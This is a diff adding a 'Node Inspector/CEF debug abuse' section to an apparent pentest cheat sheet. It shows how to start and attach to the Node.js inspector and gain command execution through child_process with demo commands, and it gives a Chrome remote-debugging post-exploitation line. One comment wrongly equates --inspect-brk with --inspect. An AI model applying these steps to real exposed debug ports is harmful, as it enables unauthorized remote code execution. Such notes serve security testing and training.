@@ -3576,6 +3576,51 @@ if __name__ == "__main__":
 
 ------------------
 
+### NODE INSPECTOR/CEF DEBUG ABUSE
+
+-----------------
+
+- When a nodejs process is started with a `--inspect` option, it listens for a debugging client.By default, it runs on port `9229`. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
+- Ways to start an inspector-:
+
+```bash
+node --inspect app.js #Will run the inspector in port 9229
+node --inspect=4444 app.js #Will run the inspector in port 4444
+node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
+node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
+# --inspect-brk is equivalent to --inspect
+
+node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
+# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
+```
+
+- RCE-:
+
+```bash
+node inspect <ip>:<port>
+node inspect 127.0.0.1:9229
+# RCE example from debug console
+debug> require("child_process").spawnSync("notepad.exe")
+```
+- Better payload -:
+  
+```nodejs
+require('child_process').execSync('ls',{stdio: 'inherit'})
+```
+![image](https://github.com/user-attachments/assets/8c7901bc-c047-4f52-90b1-98c7aa22a4d6)
+
+- POC
+
+![image](https://github.com/user-attachments/assets/1c916a15-8da2-43b0-bcef-a7f4220c89f0)
+
+- Post exploitation in a pc with Chrome
+
+```pwsh
+Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
+```
+
+------------------------
+
 
 
 
